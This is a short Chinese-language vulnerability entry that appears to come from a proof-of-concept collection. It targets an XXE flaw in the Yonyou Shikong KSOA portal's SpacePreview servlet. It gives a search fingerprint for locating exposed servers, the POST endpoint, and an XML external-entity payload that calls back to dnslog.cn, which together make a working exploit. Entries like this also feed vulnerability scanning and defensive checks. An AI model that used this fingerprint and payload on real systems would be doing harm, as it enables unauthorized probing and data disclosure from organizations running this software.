# 用友时空-KSOAcom-sksoft-common-portalXXE

用友 ｜ XXE ｜ —
- **指纹**：`body="productKSOA.jpg"`
- **请求**：`POST /servlet/com.sksoft.common.portal.SpacePreview HTTP/1.1`

**Payload**
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dnslog.cn"> ]><foo>&xxe;</foo>
```
- **响应特征**：200